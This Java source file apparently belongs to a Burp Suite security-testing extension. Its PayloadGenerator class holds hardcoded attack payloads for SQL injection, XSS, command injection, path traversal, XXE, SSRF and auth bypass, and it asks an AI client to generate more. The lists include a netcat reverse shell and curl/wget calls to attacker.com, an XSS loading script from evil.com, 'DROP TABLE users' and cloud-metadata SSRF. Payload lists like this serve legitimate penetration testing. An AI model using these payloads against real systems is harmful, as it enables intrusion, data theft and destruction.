package burp.testing;

import burp.ai.PerplexityClient;
import burp.api.montoya.MontoyaApi;
import java.util.*;

public class PayloadGenerator {
    private final MontoyaApi api;
    private final PerplexityClient perplexityClient;
    private final Map<VulnerabilityTester.TestType, List<String>> payloadDatabase;
    
    public PayloadGenerator(MontoyaApi api, PerplexityClient perplexityClient) {
        this.api = api;
        this.perplexityClient = perplexityClient;
        this.payloadDatabase = new HashMap<>();
        initializePayloadDatabase();
    }
    
    private void initializePayloadDatabase() {
        // SQL Injection payloads
        payloadDatabase.put(VulnerabilityTester.TestType.SQL_INJECTION, Arrays.asList(
            "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
            "admin'--", "admin' #", "admin'/*",
            "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "') OR ('1'='1", "') OR ('1'='1'--",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' AND '1'='2", "1' AND '1'='1",
            "' AND SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--",
            "1'; DROP TABLE users--", "1' AND 1=1--",
            "' OR 'x'='x", "' OR username IS NOT NULL--",
            "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--"
        ));
        
        // XSS payloads
        payloadDatabase.put(VulnerabilityTester.TestType.XSS, Arrays.asList(
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "javascript:alert(1)",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script src=//evil.com/xss.js></script>",
            "<img src=x onerror=\"alert('XSS')\">",
            "<svg><script>alert(1)</script></svg>",
            "<math><mtext></mtext><script>alert(1)</script></math>",
            "<table background=javascript:alert(1)></table>",
            "<<SCRIPT>alert(1);//<</SCRIPT>",
            "<iframe src=\"data:text/html,<script>alert(1)</script>\">"
        ));
        
        // Command Injection payloads
        payloadDatabase.put(VulnerabilityTester.TestType.COMMAND_INJECTION, Arrays.asList(
            "; ls", "| ls", "& ls", "&& ls", "|| ls",
            "; cat /etc/passwd", "| cat /etc/passwd",
            "; whoami", "| whoami", "& whoami",
            "`ls`", "$(ls)", "${IFS}ls",
            "; ping -c 5 127.0.0.1", "| ping -c 5 127.0.0.1",
            "; sleep 5", "| sleep 5", "& sleep 5",
            "%0A ls", "%0D%0A ls",
            "; curl attacker.com", "| wget attacker.com",
            "; nc -e /bin/sh attacker.com 4444"
        ));
        
        // Path Traversal payloads
        payloadDatabase.put(VulnerabilityTester.TestType.PATH_TRAVERSAL, Arrays.asList(
            "../", "../../", "../../../", "../../../../",
            "../../../../../../../etc/passwd",
            "../../../../../../../windows/win.ini",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
            "%2e%2e%2f", "%2e%2e/", "..%2f",
            "%252e%252e%252f", "%c0%ae%c0%ae/",
            "..%00/", "..%0d/", "..%5c",
            "..%255c", "..\\", "..\\..\\",
            "/etc/passwd", "C:\\windows\\win.ini"
        ));
        
        // XXE payloads
        payloadDatabase.put(VulnerabilityTester.TestType.XXE, Arrays.asList(
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\" >]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\" >]><foo>&xxe;</foo>"
        ));
        
        // SSRF payloads
        payloadDatabase.put(VulnerabilityTester.TestType.SSRF, Arrays.asList(
            "http://localhost", "http://127.0.0.1",
            "http://169.254.169.254", "http://metadata.google.internal",
            "http://[::1]", "http://0.0.0.0",
            "http://2130706433", "http://017700000001",
            "http://localhost:80", "http://localhost:22",
            "file:///etc/passwd", "file://c:/windows/win.ini",
            "dict://localhost:11211", "gopher://localhost:6379"
        ));
        
        // Authentication Bypass
        payloadDatabase.put(VulnerabilityTester.TestType.AUTHENTICATION_BYPASS, Arrays.asList(
            "admin", "administrator", "root", "test",
            "' OR '1'='1", "admin'--", "admin' #",
            "{\"username\":\"admin\",\"password\":\"admin\"}",
            "../../../etc/passwd%00",
            "password123", "admin123", "12345678"
        ));
        
        // Authorization Bypass
        payloadDatabase.put(VulnerabilityTester.TestType.AUTHORIZATION_BYPASS, Arrays.asList(
            "../admin", "../../admin/users",
            "?user_id=1", "?user_id=0",
            "?role=admin", "?admin=true",
            "X-Original-URL: /admin",
            "X-Rewrite-URL: /admin"
        ));
    }
    
    public List<String> getPayloadsForType(VulnerabilityTester.TestType testType) {
        return new ArrayList<>(payloadDatabase.getOrDefault(testType, Collections.emptyList()));
    }
    
    public List<String> generateContextAwarePayloads(VulnerabilityTester.TestType testType,
                                                    String context, int count) {
        // Use AI to generate context-aware payloads
        return perplexityClient.generateTestPayloads(
            testType.name().toLowerCase(),
            context,
            count
        );
    }
}
